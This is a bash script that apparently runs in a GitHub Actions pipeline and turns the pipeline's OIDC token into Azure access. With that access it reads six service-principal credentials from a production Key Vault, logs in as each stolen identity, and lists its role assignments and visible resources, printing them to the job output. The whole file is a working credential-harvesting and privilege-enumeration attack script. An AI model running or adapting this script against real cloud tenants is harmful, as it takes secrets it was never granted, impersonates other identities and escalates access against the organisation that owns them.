#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
MGMT="https://management.azure.com"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')

jwt_oid () { # $1 token
  local p; p=$(printf '%s' "$1" | cut -d. -f2 | tr '_-' '/+')
  local r=$(( ${#p} % 4 )); [ $r -ne 0 ] && p="$p$(printf '%0.s=' $(seq 1 $((4-r))))"
  printf '%s' "$p" | base64 -d 2>/dev/null | jq -r '.oid // .sub // empty'
}

declare -A RN   # roleDefId -> name cache
roleName () { # $1 token  $2 roleDefId(full)
  local id="$2"
  if [ -n "${RN[$id]:-}" ]; then echo "${RN[$id]}"; return; fi
  local n; n=$(curl -sS $M -H "Authorization: Bearer $1" "$MGMT$id?api-version=2022-04-01" | jq -r '.properties.roleName // "?"')
  RN[$id]="$n"; echo "$n"
}

enum () { # $1 label  $2 mgmt-token
  local label="$1" tok="$2"
  [ -z "$tok" ] && { echo "[$label] NO MGMT TOKEN"; return; }
  local oid; oid=$(jwt_oid "$tok")
  echo "[$label] oid=$oid"
  local ra; ra=$(curl -sS $M -H "Authorization: Bearer $tok" "$MGMT/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'$oid'")
  if printf '%s' "$ra" | jq -e '.error' >/dev/null 2>&1; then
    echo "   roleAssignments(sub) -> $(printf '%s' "$ra" | jq -c '.error.code')"
  else
    printf '%s' "$ra" | jq -r '.value[]? | [.properties.roleDefinitionId, .properties.scope] | @tsv' | while IFS=$'\t' read -r rid scope; do
      echo "   ROLE=$(roleName "$tok" "$rid")  @ $scope"
    done
    [ "$(printf '%s' "$ra" | jq -r '.value|length')" = "0" ] && echo "   (no assignments visible at sub scope for this principal)"
  fi
  # also: what resources can it see?
  local res; res=$(curl -sS $M -H "Authorization: Bearer $tok" "$MGMT/subscriptions/$SUB/resources?api-version=2021-04-01&\$top=50")
  echo "   resources visible: $(printf '%s' "$res" | jq -r 'if .error then "ERR:"+.error.code else (.value|length|tostring)+" -> "+([.value[]?.name]|join(", ")) end' 2>/dev/null | head -c 500)"
}

mgmt_tok_sp () { # $1 appId $2 secret $3 tenant
  curl -sS $M -X POST "https://login.microsoftonline.com/$3/oauth2/v2.0/token" -d "client_id=$1" -d "client_secret=$2" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty'
}

# pipeline SP management token
PMG=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
echo "=== pipeline SP ==="; enum "pipeline" "$PMG"

for name in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/$name?api-version=7.4" | jq -r '.value // empty')
  appId=$(printf '%s' "$J" | jq -r '.appId // .clientId // empty' 2>/dev/null)
  sec=$(printf '%s' "$J" | jq -r '.clientSecret // .password // .secret // empty' 2>/dev/null)
  ten=$(printf '%s' "$J" | jq -r '.tenant // .tenantId // empty' 2>/dev/null); [ -z "$ten" ] && ten=$AZURE_TENANT_ID
  echo "=== $name (appId=$appId) ==="
  tok=$(mgmt_tok_sp "$appId" "$sec" "$ten")
  enum "$name" "$tok"
done
echo "ENUM DONE"; exit 0
